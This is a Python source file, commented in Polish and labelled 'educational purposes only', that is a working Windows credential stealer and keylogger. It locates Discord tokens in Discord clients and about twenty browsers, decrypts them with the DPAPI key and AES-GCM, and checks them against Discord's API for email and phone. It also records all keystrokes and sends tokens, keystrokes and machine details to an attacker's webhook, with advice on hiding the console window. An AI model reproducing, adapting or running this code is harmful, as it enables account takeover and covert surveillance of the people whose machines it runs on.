# NAPISANE PRZEZ NIC3 (nwmtam)
# MADE BY NIC3 (nwmtam)
# EDUCATIONAL PURPOSES ONLY
# urzywaj tylko na swoich urządzeniach
import os
import platform
import socket
import json
import urllib.request
import re
import base64
import datetime
import subprocess
import sys
import time
import threading
import requests

try:
    from pynput import keyboard
except ImportError:
    print("pynput not found. Please install it: pip install pynput")
    sys.exit(1)

try:
    import win32crypt
    from Crypto.Cipher import AES
except ImportError:
    print("pycryptodome or win32crypt not found. Please install them: pip install pycryptodome pypiwin32")
    sys.exit(1)

WEBHOOK_URL = "twoj webhook daj tutaj" # webhook moze zostac zflagowany jako niebiezpieczny ale się tym nie przejmuj
SEND_INTERVAL = 10
logged_keys = []
last_send_time = time.time()

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Chrome': os.path.join(LOCAL, "Google", "Chrome", "User Data"),
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
}

def getheaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

def gettokens(path):
    tokens = []
    paths_to_try = [
        os.path.join(path, "Local Storage", "leveldb"),
        os.path.join(path, "Default", "Local Storage", "leveldb")
    ]
    
    for token_path in paths_to_try:
        if not os.path.exists(token_path):
            continue
            
        for file in os.listdir(token_path):
            if not file.endswith((".ldb", ".log")):
                continue
                
            try:
                file_path = os.path.join(token_path, file)
                with open(file_path, "r", errors="ignore") as f:
                    for line in f.readlines():
                        line = line.strip()
                        # Regex for encrypted tokens
                        for values in re.findall(r'dQw4w9WgXcQ:[^"\'\s]*', line):
                            tokens.append(values)
                        # Regex for unencrypted tokens (mfa and non-mfa)
                        for token in re.findall(r"mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27}", line):
                            tokens.append(token)
            except PermissionError:
                continue
            except Exception as e:
                print(f"Error reading {file_path}: {str(e)}")
                
    return list(set(tokens))


def getkey(path):
    paths_to_try = [path, os.path.dirname(path)]
    
    for key_path in paths_to_try:
        local_state = os.path.join(key_path, "Local State")
        if os.path.exists(local_state):
            try:
                with open(local_state, "r") as file:
                    data = file.read()
                    if 'os_crypt' in data:
                        return json.loads(data)['os_crypt']['encrypted_key']
            except Exception as e:
                print(f"Error reading Local State: {str(e)}")
                
    return None

def get_public_ip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
            return json.loads(response.read().decode()).get("ip")
    except Exception as e:
        print(f"Error getting public IP: {str(e)}")
        return "Unknown"

def decrypt_token(token, key):
    if token.startswith("dQw4w9WgXcQ:"):
        if key is None:
            return None # nie odkoduje bez klucza
        try:
            decoded_key = base64.b64decode(key)[5:]
            decrypted_key = win32crypt.CryptUnprotectData(decoded_key, None, None, None, 0)[1]
            encrypted_token_data = base64.b64decode(token.split('dQw4w9WgXcQ:')[1])
            iv = encrypted_token_data[3:15]
            ciphertext = encrypted_token_data[15:]
            cipher = AES.new(decrypted_key, AES.MODE_GCM, iv)
            return cipher.decrypt(ciphertext)[:-16].decode()
        except Exception as e:
            print(f"Error decrypting token: {str(e)}")
            return None
    else:
        return token # toke nie jest zakoodowany

def get_firefox_tokens():
    firefox_path = os.path.join(ROAMING, "Mozilla", "Firefox", "Profiles")
    tokens = []
    if not os.path.exists(firefox_path):
        return tokens

    for profile in os.listdir(firefox_path):
        if not profile.endswith((".default", ".default-release")):
            continue
        profile_path = os.path.join(firefox_path, profile)
        storage_path = os.path.join(profile_path, "storage.js")
        if not os.path.exists(storage_path):
            continue
        
        try:
            with open(storage_path, "r", errors="ignore") as f:
                data = json.load(f)
                for key, value in data.items():
                    if "token" in value:
                        token = value["token"].strip('"')
                        if re.match(r"mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27}", token):
                            tokens.append(token)
        except Exception as e:
            print(f"Error reading Firefox tokens from {profile_path}: {e}")
            
    return list(set(tokens))

def get_discord_info():
    all_discord_info = []
    checked_tokens = []
    
    print("skanowanie kompa w poszukiwaniu tokena")

    # dodaje token z firefoxa
    firefox_tokens = get_firefox_tokens()
    if firefox_tokens:
        for token in firefox_tokens:
            if token not in checked_tokens:
                checked_tokens.append(token)
                message = f'''
**New Discord Account (Firefox):**
 Token: 
{token}

 Public IP: {get_public_ip()}
 PC: {os.getenv("COMPUTERNAME", "Unknown")}\\{os.getenv("UserName", "Unknown")}
 Source: Firefox
'''
                all_discord_info.append(message)
    
    for platform_name, path in PATHS.items():
        full_path = os.path.expandvars(path)
        if not os.path.exists(full_path):
            continue
            
        key = getkey(full_path)
        tokens = gettokens(full_path)
        
        if not tokens:
            continue
            
        for token in tokens:
            decrypted_token = decrypt_token(token, key)
            
            if not decrypted_token or decrypted_token in checked_tokens:
                continue
                
            checked_tokens.append(decrypted_token)
            
            try:
                req = urllib.request.Request(
                    'https://discord.com/api/v10/users/@me',
                    headers=getheaders(decrypted_token)
                )
                
                with urllib.request.urlopen(req) as res:
                    if res.getcode() != 200:
                        continue
                        
                    user_json = json.loads(res.read().decode())
                
                user_id = user_json.get('id', 'Unknown')
                username = user_json.get('username', 'Unknown')
                email = user_json.get('email', 'No email')
                phone = user_json.get('phone', 'No phone')
                
                message = f'''
**New Discord Account: {username}**
 ID: {user_id}
 Email: {email}
 Phone: {phone}

 Token: 
{decrypted_token}

 Public IP: {get_public_ip()}
 PC: {os.getenv("COMPUTERNAME", "Unknown")}\\{os.getenv("UserName", "Unknown")}
 Source: {platform_name}
'''
                all_discord_info.append(message)
                
            except Exception as e:
                print(f"cos nie pyklo z processowaniem tokena {platform_name}: {str(e)}")
    
    if not all_discord_info:
        print("nie znaleziono tokenow")
    
    return all_discord_info

def send_to_webhook():
    global logged_keys, last_send_time
    
    if not logged_keys:
        return
        
    try:
        # laczenie wcisnietych klawiszy w jeden string
        content = "".join(logged_keys)
        
        # jesli za dlugie to podziel
        max_length = 2000
        chunks = [content[i:i+max_length] for i in range(0, len(content), max_length)]
        
        for chunk in chunks:
            payload = {"content": chunk}
            response = requests.post(WEBHOOK_URL, json=payload, timeout=10)
            
            if response.status_code == 204:
                print("wyslano")
            else:
                print(f"nie wyslano: HTTP {response.status_code}")
                
        logged_keys = []
        last_send_time = time.time()
        
    except Exception as e:
        print(f"Error : {str(e)}")

def send_initial_info():
    try:
        username = os.getlogin()
    except Exception:
        username = os.getenv("UserName", "Unknown")
    
    try:
        hostname = socket.gethostname()
    except Exception:
        hostname = "Unknown"
    
    os_info = platform.platform()
    
    try:
        local_ip = socket.gethostbyname(hostname)
    except Exception:
        local_ip = "Unknown"
    
    public_ip = get_public_ip()
    
    initial_message = f'''
 Program Started
 User: {username}
 Computer: {hostname}
 OS: {os_info}
 Local IP: {local_ip}
 Public IP: {public_ip}
'''
    
    payload = {"content": initial_message}
    
    try:
        response = requests.post(WEBHOOK_URL, json=payload, timeout=10)
        if response.status_code == 204:
            print("Initial info sent successfully")
        else:
            print(f"Failed to send initial info: HTTP {response.status_code}")
    except Exception as e:
        print(f"Error sending initial info: {str(e)}")

def send_discord_data():
    try:
        print("zbieranie danych")
        discord_data = get_discord_info()
        
        if not discord_data:
            message = " nie znaleziono kont discord"
            requests.post(WEBHOOK_URL, json={"content": message})
            print(message)
            return
            
        print(f"Found {len(discord_data)} Discord accounts")
        
        for data in discord_data:
            # dc ma limit 2000 znakow na wiadomosc
            if len(data) > 2000:
                # oodziel na części jeśli zbyt długie
                chunks = [data[i:i+2000] for i in range(0, len(data), 2000)]
                for chunk in chunks:
                    payload = {"content": chunk}
                    try:
                        response = requests.post(WEBHOOK_URL, json=payload, timeout=15)
                        if response.status_code == 204:
                            print("wyslano dane discord")
                        else:
                            print(f"nie wyslano: HTTP {response.status_code}")
                        time.sleep(1)  # ogranicz szybkość wysyłania
                    except Exception as e:
                        print(f"Error sending Discord data: {str(e)}")
            else:
                payload = {"content": data}
                try:
                    response = requests.post(WEBHOOK_URL, json=payload, timeout=15)
                    if response.status_code == 204:
                        print("wyslano dc")
                    else:
                        print(f"Failed to send Discord data: HTTP {response.status_code}")
                    time.sleep(1)  # ogranicz szybkość wysyłania
                except Exception as e:
                    print(f"Error sending Discord data: {str(e)}")
                    
    except Exception as e:
        print(f"Error in send_discord_data: {str(e)}")

def on_press(key):
    global logged_keys
    
    try:
        logged_keys.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            logged_keys.append(" ")
        elif key == keyboard.Key.enter:
            logged_keys.append("\n")
        elif key == keyboard.Key.tab:
            logged_keys.append("\t")
        elif key == keyboard.Key.backspace:
            logged_keys.append("[BACKSPACE]")
        elif key == keyboard.Key.esc:
            logged_keys.append("[ESC]")
        else:
            logged_keys.append(f"[{str(key).replace('Key.', '')}]")

def monitor_and_send():
    while True:
        time.sleep(1)
        if time.time() - last_send_time >= SEND_INTERVAL:
            send_to_webhook()

if __name__ == "__main__":
    if os.name != "nt":
        print("This script is designed for Windows only due to win32crypt dependency.")
        sys.exit(1)
    print("jesli to widzisz to nie ustaiwłeś formatu pliku na .pyw by nie widzieć tego okna")
    print("start")
    
    send_initial_info()
    
    discord_thread = threading.Thread(target=send_discord_data)
    discord_thread.daemon = True
    discord_thread.start()
    
    sender_thread = threading.Thread(target=monitor_and_send)
    sender_thread.daemon = True
    sender_thread.start()
    
    print("nasluchiwanie klawiatury")
    
    try:
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except Exception as e:
        print(f"error jakis nasluchiwania (jak nie działa to se sam napraw): {str(e)}")
        sys.exit(1)
